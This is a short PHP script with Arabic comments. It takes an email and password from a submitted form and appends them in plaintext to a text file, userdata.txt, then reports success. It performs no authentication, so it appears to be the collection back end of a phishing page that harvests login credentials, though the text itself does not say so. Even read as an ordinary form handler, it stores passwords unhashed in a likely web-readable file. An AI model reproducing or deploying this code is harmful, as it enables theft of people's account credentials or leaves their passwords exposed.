<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // استلام البيانات من النموذج
    $email = $_POST['email'];
    $password = $_POST['password'];

    // التحقق من وجود البيانات
    if (!empty($email) && !empty($password)) {
        // تحديد اسم ملف النص
        $txtFileName = 'userdata.txt';

        // تكوين البيانات للكتابة في الملف
        $dataToWrite = "Email: $email\nPassword: $password\n\n";

        // كتابة البيانات إلى الملف
        file_put_contents($txtFileName, $dataToWrite, FILE_APPEND);

        // استجابة بنجاح
        echo "تم استقبال البيانات بنجاح!";
    } else {
        // إذا لم تكن البيانات مكتملة
        echo "الرجاء تقديم البريد الإلكتروني وكلمة المرور.";
    }
} else {
    // إذا كان الطلب ليس POST
    echo "طلب غير صحيح.";
}

?>

